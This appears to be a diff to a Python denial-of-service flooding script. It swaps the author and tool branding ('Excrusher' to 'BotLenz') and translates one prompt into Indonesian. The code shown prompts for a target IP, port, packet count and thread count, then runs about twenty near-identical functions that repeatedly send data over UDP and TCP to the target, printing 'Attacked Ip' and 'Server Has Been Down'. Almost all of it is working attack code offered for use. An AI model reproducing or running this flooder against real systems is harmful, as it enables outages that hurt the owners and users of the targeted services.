@@ -3,12 +3,12 @@ import socket
 import threading
 import os,sys
 os.system("clear")
-print("Codes Private By Sanzo")
+print("Codes Private By Lenz")
 print("Dont Abuse Tools")
-print("EXCRUSHER COMMUNITY")
+print("LenzGod")
 ip = str(input("IP TARGET:"))
 port = int(input("PORT TARGET:"))
-choice = str(input("Do you want to attack?(y/n):"))
+choice = str(input("kamu bersedia untuk attack ip tersebut?(y/n):"))
 times = int(input("PACKET (7500):"))
 threads = int(input("THREADS (2800):"))
 os.system("clear")
@@ -21,7 +21,7 @@ def run():
             addr = (str(ip),int(port))
             for x in range(times):
                 s.sendto(data,addr)
-            print(i +"Excrusher Attacked Ip %s And Port : %s"%(ip, port))
+            print(i +"BotLenz Attacked Ip %s And Port : %s"%(ip, port))
         except:
             print("Server Has Been Down")
             
@@ -35,7 +35,7 @@ def run2():
             s.send(data)
             for x in range(times):
                 s.send(data)
-            print(i +"Excrusher Attacked Ip %s And Port : %s"%(ip, port))
+            print(i +"BotLenz Attacked Ip %s And Port : %s"%(ip, port))
         except:
             s.close()
             print("Server Has Been Down")
@@ -50,7 +50,7 @@ def run3():
             s.send(data)
             for x in range(times):
                 s.send(data)
-            print(i +"Excrusher Attacked Ip %s And Port : %s"%(ip, port))
+            print(i +"BotLenz Attacked Ip %s And Port : %s"%(ip, port))
         except:
             s.close()
             print("Server Has Been Down")
@@ -65,7 +65,7 @@ def run4():
             s.send(data)
             for x in range(times):
                 s.send(data)
-            print(i +"Excrusher Attacked Ip %s And Port : %s"%(ip, port))
+            print(i +"BotLenz Attacked Ip %s And Port : %s"%(ip, port))
         except:
             s.close()
             print("Server Has Been Down")
@@ -79,7 +79,7 @@ def run5():
             addr = (str(ip),int(port))
             for x in range(times):
                 s.sendto(data,addr)
-            print(i +"Excrusher Attacked Ip %s And Port : %s"%(ip, port))
+            print(i +"BotLenz Attacked Ip %s And Port : %s"%(ip, port))
         except:
             print("Server Has Been Down")
             
@@ -93,7 +93,7 @@ def run6():
             s.send(data)
             for x in range(times):
                 s.send(data)
-            print(i +"Excrusher Attacked Ip %s And Port : %s"%(ip, port))
+            print(i +"BotLenz Attacked Ip %s And Port : %s"%(ip, port))
         except:
             s.close()
             print("Server Has Been Down")
@@ -108,7 +108,7 @@ def run7():
             s.send(data)
             for x in range(times):
                 s.send(data)
-            print(i +"Excrusher Attacked Ip %s And Port : %s"%(ip, port))
+            print(i +"BotLenz Attacked Ip %s And Port : %s"%(ip, port))
         except:
             s.close()
             print("Server Has Been Down")
@@ -123,7 +123,7 @@ def run8():
             s.send(data)
             for x in range(times):
                 s.send(data)
-            print(i +"Excrusher Attacked Ip %s And Port : %s"%(ip, port))
+            print(i +"BotLenz Attacked Ip %s And Port : %s"%(ip, port))
         except:
             s.close()
             print("Server Has Been Down")
@@ -137,7 +137,7 @@ def run9():
             addr = (str(ip),int(port))
             for x in range(times):
                 s.sendto(data,addr)
-            print(i +"Excrusher Attacked Ip %s Dan Port : %s"%(ip, port))
+            print(i +"BotLenz Attacked Ip %s And Port : %s"%(ip, port))
         except:
             print("Server Has Been Down")
             
@@ -151,7 +151,7 @@ def run10():
             s.send(data)
             for x in range(times):
                 s.send(data)
-            print(i +"Excrusher Attacked Ip %s And Port : %s"%(ip, port))
+            print(i +"BotLenz Attacked Ip %s And Port : %s"%(ip, port))
         except:
             s.close()
             print("Server Has Been Down")
@@ -166,7 +166,7 @@ def run11():
             s.send(data)
             for x in range(times):
                 s.send(data)
-            print(i +"Excrusher Attacked Ip %s And Port : %s"%(ip, port))
+            print(i +"BotLenz Attacked Ip %s And Port : %s"%(ip, port))
         except:
             s.close()
             print("Server Has Been Down")
@@ -181,7 +181,7 @@ def run12():
             s.send(data)
             for x in range(times):
                 s.send(data)
-            print(i +"Excrusher Attacked Ip %s And Port : %s"%(ip, port))
+            print(i +"BotLenz Attacked Ip %s And Port : %s"%(ip, port))
         except:
             s.close()
             print("Server Has Been Down")
@@ -196,7 +196,7 @@ def run13():
             s.send(data)
             for x in range(times):
                 s.send(data)
-            print(i +"Excrusher Attacked Ip %s And Port : %s"%(ip, port))
+            print(i +"BotLenz Attacked Ip %s And Port : %s"%(ip, port))
         except:
             s.close()
             print("Server Has Been Down")
@@ -211,7 +211,7 @@ def run14():
             s.send(data)
             for x in range(times):
                 s.send(data)
-            print(i +"Excrusher Attacked Ip %s And Port : %s"%(ip, port))
+            print(i +"BotLenz Attacked Ip %s And Port : %s"%(ip, port))
         except:
             s.close()
             print("Server Has Been Down")
@@ -226,7 +226,7 @@ def run15():
           s.send(data)
           for x in range (times):
                 s.send(data)
-          print(i +"Excrusher Attacked Ip %s And Port : %s"%(ip, port))
+          print(i +"BotLenz Attacked Ip %s And Port : %s"%(ip, port))
        except :
            s.close()
            print("Server Has Been Down")
@@ -241,7 +241,7 @@ def run16():
           s.send(data)
           for x in range (times):
               s.send(data)
-          print(i +"Excrusher Attacked Ip %s And Port : %s"%(ip, port))  
+          print(i +"BotLenz Attacked Ip %s And Port : %s"%(ip, port))  
        except :
            s.close()
            print("Server Has Been Down")
@@ -256,7 +256,7 @@ def run17():
             s.send(data)
             for x in range (times):
                 s.send(data)
-            print(i +"Excrusher Attacked Ip %s And Port : %s"%(ip, port))  
+            print(i +"BotLenz Attacked Ip %s And Port : %s"%(ip, port))  
         except :
             s.close()
             print("Server Has Been Down")     
@@ -271,7 +271,7 @@ def run18():
             s.send(data)
             for x in range (times):
                 s.send(data)
-            print(i +"Excrusher Attacked Ip %s And Port : %s"%(ip, port))  
+            print(i +"BotLenz Attacked Ip %s And Port : %s"%(ip, port))  
         except :
             s.close()
             print("Server Has Been Down") 
@@ -286,7 +286,7 @@ def run19():
             s.send(data)
             for x in range (times):
                   s.send(data)
-            print(i +"Excrusher Attacked Ip %s And Port : %s"%(ip, port))  
+            print(i +"BotLenz Attacked Ip %s And Port : %s"%(ip, port))  
         except :
             s.close()
             print("Server Has Been Down")     
@@ -301,7 +301,7 @@ def run20():
             s.send(data)
             for x in range (times):
                 s.send(data)
-            print(i +"Excrusher Attacked Ip %s And Port : %s"%(ip, port))  
+            print(i +"BotLenz Attacked Ip %s And Port : %s"%(ip, port))  
         except :
             s.close()
             print("Server Has Been Down")                 
